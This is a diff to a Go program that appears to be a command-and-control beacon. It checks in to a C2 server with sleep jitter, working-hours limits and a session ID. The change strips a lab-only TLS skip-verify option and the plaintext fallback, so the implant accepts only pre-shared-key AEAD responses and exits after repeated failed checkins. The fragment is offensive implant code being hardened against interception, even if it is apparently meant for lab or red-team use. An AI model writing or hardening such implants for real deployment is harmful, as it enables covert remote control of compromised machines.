@@ -14,12 +14,11 @@
 //	SC5_MAX_MISS  max failed checkins before exit (default 0=unlimited)
 //	SC5_WORK_START 0-23 optional
 //	SC5_WORK_END   0-23 optional
-//	SC5_TLS_SKIP_VERIFY 1 for lab self-signed only
+// TLS always verifies system roots (use a real cert or lab CA in the trust store).
 package main
 
 import (
 	"bytes"
-	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -96,13 +95,9 @@ func main() {
 	maxMiss := envInt("SC5_MAX_MISS", 0)
 	workStart := envInt("SC5_WORK_START", 0)
 	workEnd := envInt("SC5_WORK_END", 0)
-	skipTLS := os.Getenv("SC5_TLS_SKIP_VERIFY") == "1"
 
-	tr := &http.Transport{}
-	if skipTLS {
-		tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} // lab only
-	}
-	client := &http.Client{Timeout: 45 * time.Second, Transport: tr}
+	// Always verify TLS (system CA store / SSL_CERT_FILE). No skip-verify path.
+	client := &http.Client{Timeout: 45 * time.Second}
 
 	var sid any
 	miss := 0
@@ -175,13 +170,15 @@ func main() {
 			sleepJitter(sleep, jitter)
 			continue
 		}
+		// AEAD required — refuse plaintext C2 responses
 		plain, err := openEnv(psk, env)
 		if err != nil {
-			// try plain JSON (auth disabled lab)
-			if json.Unmarshal(b, &plain) != nil {
-				sleepJitter(sleep, jitter)
-				continue
+			miss++
+			if maxMiss > 0 && miss >= maxMiss {
+				return
 			}
+			sleepJitter(sleep, jitter)
+			continue
 		}
 		if s, ok := plain["session_id"]; ok {
 			sid = s
